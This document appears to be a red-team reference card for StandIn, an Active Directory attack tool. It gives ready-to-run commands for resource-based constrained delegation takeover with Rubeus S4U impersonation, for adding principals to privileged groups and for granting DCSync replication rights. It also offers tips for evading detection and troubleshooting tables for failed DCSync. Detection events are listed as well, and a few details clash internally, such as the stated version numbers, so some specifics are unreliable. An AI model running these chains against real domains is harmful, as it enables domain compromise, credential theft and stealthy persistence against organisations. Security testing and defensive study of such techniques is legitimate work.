---
name: StandIn
category: acl-abuse
subcategories: [rbcd, computer-object-creation, ad-manipulation, group-membership-add, acl-write, domain-admins-add, dcsync-rights-grant, replication-rights]
tradecraft_tags: [rbcd, computer-account, delegation, acl, ad, fuzzysecurity, group, group-membership, add-member, addself, addmember, genericall, genericwrite, writedacl, writeowner, ldap, ldap-write, non-powershell, domain-admins, dcsync, dcsync-rights, replication, replication-rights, ds-replication, get-changes, extended-rights, grant-replication]
mitre_attack:
  - id: T1098
    name: Account Manipulation
source:
  url: https://github.com/FuzzySecurity/StandIn
  license: Unknown
  maintained: true
binary_type: .net-assembly
binary_filename: StandIn.exe
supported_os: [windows]
architecture: [x64, x86]
privilege_required: domain-user
network_required: true
detection_signal: |
  StandIn's computer object creation generates Event 4741 (computer account created)
  and LDAP writes to the domain. RBCD manipulation (writing msDS-AllowedToActOnBehalfOfOtherIdentity)
  generates Event 5136 (directory service object modification). Machine account quota
  (ms-DS-MachineAccountQuota) checks are standard LDAP reads. MDI monitors RBCD-related
  attribute writes.
usage_examples:
  - description: Create a new computer account (for RBCD)
    args: "--computer <ATTACKER_MACHINE> --password <MACHINE_PASSWORD>"
  - description: Set RBCD on a target computer
    args: "--rbcd --computer <ATTACKER_MACHINE> --target <TARGET_COMPUTER>"
  - description: Add a principal to a group over LDAP when the controlled identity holds the required group-object ACL right
    args: 'StandIn.exe --group "<TARGET_GROUP>" --ntaccount "<CONTROLLED_PRINCIPAL>" --add'
  - description: Grant both DCSync replication rights to a principal on a domain object when the controlled identity owns its DACL
    args: 'StandIn.exe --object "<TARGET_DOMAIN_DN>" --grant "<CONTROLLED_PRINCIPAL>" --guid <REPLICATION_RIGHT_GUID>'
  - description: List existing RBCD delegations on a machine
    args: "--rbcd --list --computer <TARGET_COMPUTER>"
  - description: Remove RBCD delegation (cleanup)
    args: "--rbcd --remove --computer <ATTACKER_MACHINE> --target <TARGET_COMPUTER>"
  - description: Query / verify group membership (run before and after the add to confirm the change)
    args: 'StandIn.exe --group "<TARGET_GROUP>"'
opsec_notes: |
  Computer account creation (for RBCD) is audited — Event 4741 is generated and new
  machine accounts are visible in AD immediately. High-value RBCD targets (DCs, domain
  admins' machines) will attract attention if newly-created machine accounts appear in
  delegation ACLs. When possible, reuse an existing machine account you control rather
  than creating a new one. msDS-AllowedToActOnBehalfOfOtherIdentity writes on sensitive
  computer objects are a strong MDI detection signal.
gotchas: |
  MachineAccountQuota (MAQ, default=10) limits how many computer accounts a domain user
  can create — if MAQ is 0, StandIn's computer creation will fail. Check MAQ first
  (SharpHound output or LDAP query). RBCD requires the account being written to the
  delegation attribute to be a Security Principal with an SPN — a newly-created computer
  account has SPNs auto-generated, which makes it ideal. The S4U2self step then requires
  Rubeus with the computer account's credentials. Note: RBCD requires at minimum Windows
  Server 2012 functional level.
related_ttps: [rubeus, whisker, sharpgpoabuse, sharphound, krbrelay]
alternatives: [powermad, impacket-addcomputer]
common_args:
  --computer:
    name: --computer
    description: Computer account name (without $ suffix) for creation or RBCD operations
    typical_values: ["<ATTACKER_MACHINE>", "controlled-machine"]
    required: false
  --password:
    name: --password
    description: Password for newly-created computer account
    typical_values: ["<MACHINE_PASSWORD>"]
  --rbcd:
    name: --rbcd
    description: Enable RBCD mode — write or remove msDS-AllowedToActOnBehalfOfOtherIdentity
    typical_values: [flag-only]
  --target:
    name: --target
    description: Target computer account$ to write RBCD delegation to
    typical_values: ["<TARGET_COMPUTER>", "target-server$"]
  --group:
    name: --group
    description: Operate on a group object
    typical_values: [flag-only]
  --add:
    name: --add
    description: Add member to group
    typical_values: [flag-only]
  --ntaccount:
    name: --ntaccount
    description: 'NT account (DOMAIN\User) to add to or remove from a group — the principal, used with --group --add/--remove'
    typical_values: ['DOMAIN\operator', 'DOMAIN\service-account']
  --remove:
    name: --remove
    description: Remove member or delegation
    typical_values: [flag-only]
  --list:
    name: --list
    description: List RBCD delegations on the target
    typical_values: [flag-only]
  --object:
    name: --object
    description: 'Target an AD object by DistinguishedName for ACL/extended-right operations; for DCSync this is the domainDNS root, not a user or computer'
    typical_values: ['<TARGET_DOMAIN_DN>']
    required: false
  --grant:
    name: --grant
    description: 'NT account (DOMAIN\User) to grant an extended right / ACE to on the --object target. Pair with --guid for a specific control-access right such as DS-Replication-Get-Changes'
    typical_values: ['<CONTROLLED_PRINCIPAL>']
    required: false
  --guid:
    name: --guid
    description: 'Schema GUID of the extended right to grant via --object/--grant. DCSync needs BOTH DS-Replication-Get-Changes (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) and DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)'
    typical_values: ['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2']
    required: false
last_updated: 2026-06-06
---

# StandIn

FuzzySecurity's multi-purpose AD manipulation tool for post-exploitation. StandIn's
primary use in RBCD (Resource-Based Constrained Delegation) chains is creating a new
machine account and writing it to the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`
attribute. It also handles general AD group manipulation, object queries, and ACL operations.

## Typical use cases
- Create a new machine account when you have GenericAll/WriteDACL on a computer object (RBCD setup step 1)
- Write the new machine account to msDS-AllowedToActOnBehalfOfOtherIdentity on the target (RBCD setup step 2)
- Add a user to a domain group when ACL allows self-addition (GenericAll/AddSelf)
- Query AD group memberships
- Clean up RBCD delegations after use

## Generic RBCD setup
When directory or graph evidence identifies a controlled principal with the required ACL right on a
computer object, StandIn can create or reuse `<ATTACKER_MACHINE>` and write its SID to
`<TARGET_COMPUTER>`'s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. The resulting machine
credential can be used in a separate, objective-scoped S4U2self/S4U2proxy workflow. KrbRelay can
instead perform the LDAP relay and RBCD setup for a local privilege-escalation case.

## DCSync rights grant (DS-Replication) — non-PowerShell

Use this technique when a controlled principal can write the domain object's DACL
(`WriteDACL`/`GenericAll`/`WriteOwner` on the domain head, or membership in a group that holds it)
but does **not yet hold DCSync rights**. Native `dcsync` and `mimikatz lsadump::dcsync`
requires TWO extended rights on the domain object; grant both ACEs over LDAP with StandIn — no
PowerShell, no PowerView — then DCSync.

**Read the GetNCChanges error code — it tells you which problem you have (do NOT conflate them):**

| Error | Meaning | Remedy |
|-------|---------|--------|
| `0x20f7` / **8439 `DS_DRA_BAD_DN`** | Invalid/wrong naming context — the request did not resolve a valid NC. | Correct the target realm, `/domain:`, `/dc:`, and DN. A rights grant cannot repair 8439. |
| `0x2105` / **8453 `DS_DRA_ACCESS_DENIED`** | The principal lacks DS-Replication rights on the (correctly-targeted) NC. | Apply the two-ACE grant below, then re-DCSync. |

The two required control-access rights (fixed Microsoft GUIDs):

| Extended right | Schema GUID |
|----------------|-------------|
| `DS-Replication-Get-Changes` | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` |
| `DS-Replication-Get-Changes-All` | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` |

`--object` must identify `<TARGET_DOMAIN_DN>`, and the LDAP operation must bind to
`<TARGET_DC_FQDN>`. A domain DN issued to a DC in another realm produces 8439 or a malformed LDAP
filter.

```
# Grant DS-Replication-Get-Changes on the target domain object
StandIn.exe --object "<TARGET_DOMAIN_DN>" --grant "<CONTROLLED_PRINCIPAL>" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2

# Grant DS-Replication-Get-Changes-All (both are required for a full DCSync)
StandIn.exe --object "<TARGET_DOMAIN_DN>" --grant "<CONTROLLED_PRINCIPAL>" --guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

# Separately verify and use the rights against the same DC as the controlled principal
# dcsync /domain:<TARGET_DOMAIN_FQDN> /dc:<TARGET_DC_FQDN> /user:<PROTECTED_ACCOUNT>
```

**Gotchas that look like "the grant failed" but aren't:**
- **Replication latency — use the same DC for grant and readback.** Pointing the DCSync request at a
  different DC before convergence can return 8453 again.
- **Security context.** `dcsync` uses the *current token* unless you pass creds — run it as the **granted
  principal** (the exact NTAccount you passed to `--grant`), or pass that principal's creds. Granting one
  account and DCSyncing as another applies no rights.
- **WriteDACL precondition (distinguish the two rejections).** To write the ACE the controlled principal
  must already hold `WriteDACL`/`WriteOwner`/`GenericAll`/`Owns` on `<TARGET_DOMAIN_DN>`. If the **StandIn
  `--grant` call itself** is rejected, that prereq is missing — a different failure from a rejected `dcsync`.
- **Cross-realm SID resolution.** A principal granted on another realm's domain object must resolve to a
  SID that `<TARGET_DC_FQDN>` honors, and the later operation must use that exact principal.

**Verify the grant landed:** re-read the domain object's DACL (`--ntacl --object
"<TARGET_DOMAIN_DN>"`) and confirm both Allow ACEs are present. One alone is insufficient.

> **Binding caveat — confirm against the live binary.** StandIn's `--object` historically takes a search
> term; granting on the **domain root** (`objectClass=domainDNS`) is an unusual target. The `--grant`/`--guid`
> shape should be verified against the deployed binary, and a normal user/group bind does not prove the
> domain-root bind. Preserve this domain-root distinction when selecting an alternative DACL editor.

**OPSEC:** each `--grant` writes the domain object's DACL → Event 5136; MDI flags DCSync-rights grants.
This is a high-signal, persistent change — clean up with `--object ... --grant ... --guid ... --remove`.

## Output
Text output confirming operations:
- `--computer` creation: success message with computer account DistinguishedName
- `--rbcd` write: confirmation with updated attribute value
- `--group` queries: group member listing

## OPSEC considerations
Machine account creation (Event 4741) and RBCD attribute writes (Event 5136) are audited
operations. High-value targets (DCs, domain admin workstations) will trigger MDI detection.
Prefer creating machine accounts with realistic naming. Clean up
RBCD delegations and created machine accounts after use.

## Full Reference

> Captured against StandIn v0.9.0, 2026-05-29. Source: https://github.com/FuzzySecurity/StandIn README.

### Sub-commands / primary flags

| Flag | Description |
|------|-------------|
| `--computer X --password X` | Create a machine account with the specified name and password |
| `--rbcd --computer X --target X` | Write RBCD delegation: allow X$ to impersonate users to target |
| `--rbcd --list --computer X` | List RBCD delegations on target |
| `--rbcd --remove --computer X --target X` | Remove RBCD delegation |
| `--group "GroupName"` | Query group object (member list) |
| `--group "GroupName" --ntaccount "DOMAIN\User" --add` | Add a principal to a group (use when you hold GenericAll/AddSelf/AddMember/WriteDACL on the group) — verified syntax |
| `--group "GroupName" --ntaccount "DOMAIN\User" --remove` | Remove a principal from a group (cleanup) |
| `--object X` | Query a specific AD object by DN |
| `--ntacl --object X` | Dump NT ACL for an AD object |
| `--object <DN> --grant "DOMAIN\User" --guid <ext-right-GUID>` | Grant a specific extended-right ACE to a principal on the object — DCSync = grant BOTH `1131f6aa-…` and `1131f6ad-…` on the target forest's domain DN (see "DCSync rights grant" above) — verified v1.4 syntax |
| `--object <DN> --grant "DOMAIN\User" --guid <GUID> --remove` | Remove a previously-granted ACE (cleanup) |
| `--hash` | Hash manipulation operations |
| `--kerbfixup X` | Fix Kerberos SPN mapping |
| `--delegation --target X` | Query constrained delegation settings |
| `--policy` | Query fine-grained password policies |
| `--spn --domain X` | Query all SPNs in domain |

### RBCD workflow with Rubeus

```
# Step 1: Create machine account
StandIn.exe --computer <ATTACKER_MACHINE> --password "<MACHINE_PASSWORD>"

# Step 2: Write RBCD
StandIn.exe --rbcd --computer <ATTACKER_MACHINE> --target <TARGET_COMPUTER>

# Step 3: Get TGT for new machine account
Rubeus.exe asktgt /user:<ATTACKER_MACHINE>$ /password:"<MACHINE_PASSWORD>" /domain:<TARGET_DOMAIN_FQDN> /nowrap

# Step 4: S4U chain to impersonate admin to target
Rubeus.exe s4u /ticket:<TGT> /impersonateuser:<PROTECTED_ACCOUNT> /msdsspn:cifs/<TARGET_COMPUTER> /ptt
```

### Prerequisites

- `ms-DS-MachineAccountQuota` > 0 (default 10) for computer account creation
- GenericWrite or higher on target computer object for RBCD attribute write
- Windows Server 2012 R2+ domain functional level for RBCD

### Source for this reference

- https://github.com/FuzzySecurity/StandIn (README)
- FuzzySecurity blog: https://www.fuzzysecurity.com/tutorials/ad_exploitation/standin.html
- Version: v0.9.0 as of 2026-05-29
